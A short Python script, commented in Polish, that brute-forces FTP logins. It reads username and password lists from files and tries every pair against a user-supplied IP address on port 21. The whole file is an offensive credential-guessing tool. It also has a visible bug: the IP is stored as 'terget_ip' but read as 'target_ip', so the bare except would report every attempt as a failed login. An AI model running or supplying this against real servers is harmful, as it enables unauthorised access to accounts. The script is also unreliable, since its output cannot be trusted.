import ftplib

terget_ip = input("podaj adres IP: ")
port = 21

#otwieramy plik

with open("passwords.txt") as passwords:
    passwd = passwords.read().splitlines() #czytamy linia po lini dany dokument
with open("usernames.txt") as users:
    usernames = users.read().splitlines()

#print(passwd)

##### utworzenie klienta ftp

client = ftplib.FTP()

##### bruteforce

for user in usernames:
    for password in passwd:
        try:
            client.connect(target_ip, port, timeout = 2)
            client.login(user, password) # proba logowania z ftp
            print("Połączyłeś się do FTP danymi usernames {} i password {}".format(user, password))

        except:
            print("Logowanie na dane username {} i password {} nie powiodło się".format(user, password))
